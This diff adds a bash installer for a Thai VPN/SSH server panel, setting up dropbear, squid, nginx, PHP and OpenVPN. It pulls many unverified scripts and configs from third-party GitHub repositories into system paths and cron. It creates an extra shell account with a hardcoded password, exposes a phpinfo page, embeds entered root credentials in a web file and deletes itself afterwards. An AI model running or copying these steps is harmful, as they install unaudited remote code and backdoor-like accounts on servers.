@@ -1,0 +1,155 @@
+#!/bin/bash
+
+# initialisasi var
+export DEBIAN_FRONTEND=noninteractive
+OS=`uname -m`;
+MYIP=$(wget -qO- ipv4.icanhazip.com);
+MYIP2="s/xxxxxxxxx/$MYIP/g";
+MYPORT="s/85/99/g";
+
+# go to root
+cd
+
+#ca-certificates
+apt-get install ca-certificates
+
+# setting port ssh
+sed -i 's/Port 22/Port 22/g' /etc/ssh/sshd_config
+sed -i '/Port 22/a Port 143' /etc/ssh/sshd_config
+service ssh restart
+
+# install dropbear
+apt-get -y install dropbear
+sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=443/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 443 -p 80"/g' /etc/default/dropbear
+echo "/bin/false" >> /etc/shells
+echo "/usr/sbin/nologin" >> /etc/shells
+service ssh restart
+service dropbear restart
+
+# install squid3
+cd
+apt-get -y install squid3
+wget -O /etc/squid3/squid.conf "https://raw.githubusercontent.com/dathai/Wedssh/master/API/squid.conf"
+sed -i $MYIP2 /etc/squid3/squid.conf;
+service squid3 restart
+
+# install webserver
+cd
+apt-get -y install nginx php5 php5-fpm php5-cli php5-mysql php5-mcrypt
+rm /etc/nginx/sites-enabled/default && rm /etc/nginx/sites-available/default
+mv /etc/nginx/nginx.conf /etc/nginx/nginx.conf.backup
+mv /etc/nginx/conf.d/vps.conf /etc/nginx/conf.d/vps.conf.backup
+wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/nginx.conf"
+wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/vps.conf"
+sed -i 's/cgi.fix_pathinfo=1/cgi.fix_pathinfo=0/g' /etc/php5/fpm/php.ini
+sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
+sed -i $MYPORT /etc/nginx/conf.d/vps.conf;
+useradd -m vps && mkdir -p /home/vps/public_html
+rm /home/vps/public_html/index.html && echo "<?php phpinfo() ?>" > /home/vps/public_html/info.php
+chown -R www-data:www-data /home/vps/public_html && chmod -R g+rw /home/vps/public_html
+service php5-fpm restart && service nginx restart
+
+# openvpn
+apt-get -y install openvpn
+cd /etc/openvpn/
+wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
+wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/iptables.up.rules"
+sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
+sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
+iptables-restore < /etc/iptables.up.rules
+# etc
+wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/client.ovpn"
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
+cd;wget https://raw.githubusercontent.com/chunyen91/Ford_7752/master/vervpn8/cronjob.tar
+tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
+mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
+chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
+useradd -m -g users -s /bin/bash dragon
+echo "Wutoh:369" | chpasswd
+echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
+rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
+clear
+# install myweb
+cd /home/vps/public_html/
+wget -O /home/vps/public_html/myweb.tar "https://raw.githubusercontent.com/dathai/Wedssh/master/API/myweb.tar"
+cd /home/vps/public_html/
+tar xf myweb.tar
+
+# Setting web
+echo -e "\033[01;31mIP User And Pass 'ROOT' Only \033[0m"
+read -p "IP : " MyIPD
+read -p "Username : " Login
+read -p "Password : " Passwd
+MYIPS="s/xxxxxxxxx/$MyIPD/g";
+US1="s/arch19user/$Login/g";
+PS2="s/arch19pass/$Passwd/g";
+sed -i $MYIPS /home/vps/public_html/index.php;
+sed -i $US1 /home/vps/public_html/index.php;
+sed -i $PS2 /home/vps/public_html/index.php;
+
+#FIGlet In Linux
+sudo apt-get install figlet
+yum install figlet
+
+#RM file
+rm -f myweb.tar
+cd
+rm -f install.sh
+# download script
+cd
+wget -O /usr/bin/benchmark "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/benchmark.sh"
+wget -O /usr/bin/speedtest "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/speedtest.py"
+wget -O /usr/bin/ps_mem "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/ps_mem.py"
+wget -O /etc/issue.net "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/banner"
+wget -O /usr/bin/dropmon "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/dropmon.sh"
+wget -O /usr/bin/menu "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/menu.sh"
+wget -O /usr/bin/user-add "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add.sh"
+wget -O /usr/bin/user-add-vpn "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add-vpn.sh"
+wget -O /usr/bin/user-add-pptp "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-add-pptp.sh"
+wget -O /usr/bin/user-expire "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-expire.sh"
+wget -O /usr/bin/user-gen "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-gen.sh"
+wget -O /usr/bin/user-limit "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-limit.sh"
+wget -O /usr/bin/user-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-list.sh"
+wget -O /usr/bin/user-login "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-login.sh"
+wget -O /usr/bin/user-active-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-active-list.sh"
+wget -O /usr/bin/user-renew "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-renew.sh"
+wget -O /usr/bin/user-del "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-del.sh"
+wget -O /usr/bin/user-pass "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-pass.sh"
+wget -O /usr/bin/user-expire-list "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-expire-list.sh"
+wget -O /usr/bin/user-banned "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/user-banned.sh"
+wget -O /usr/bin/unbanned-user "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/unbanned-user.sh"
+wget -O /usr/bin/delete-user-expire "https://raw.githubusercontent.com/Mbah-Shondong/Debian732/master/Debian7/delete-user-expire.sh"
+echo "0 0 * * * root /usr/bin/user-expire" > /etc/cron.d/user-expire
+echo "* * * * * service dropbear restart" > /etc/cron.d/dropbear
+chmod +x /usr/bin/benchmark
+chmod +x /usr/bin/speedtest
+chmod +x /usr/bin/ps_mem
+chmod +x /usr/bin/dropmon
+chmod +x /usr/bin/menu
+chmod +x /usr/bin/user-add
+chmod +x /usr/bin/user-add-vpn
+chmod +x /usr/bin/user-add-pptp
+chmod +x /usr/bin/user-expire
+chmod +x /usr/bin/user-gen
+chmod +x /usr/bin/user-limit
+chmod +x /usr/bin/user-list
+chmod +x /usr/bin/user-login
+chmod +x /usr/bin/user-active-list
+chmod +x /usr/bin/user-renew
+chmod +x /usr/bin/user-del
+chmod +x /usr/bin/user-pass
+chmod +x /usr/bin/user-expire-list
+chmod +x /usr/bin/user-banned
+chmod +x /usr/bin/unbanned-user
+chmod +x /usr/bin/delete-user-expire
+# About
+clear
+figlet "THAI-VPN"
+echo "Script WebSSH Auto Install"
+echo "-Web Server"
+echo "-Squid Proxy Port 80,8080,3128"
+echo "Squid     :  http://$MYIP:8080"
+echo "Nginx      :  http://$MYIP:99"
+echo "Web    :  http://$MYIP:99"
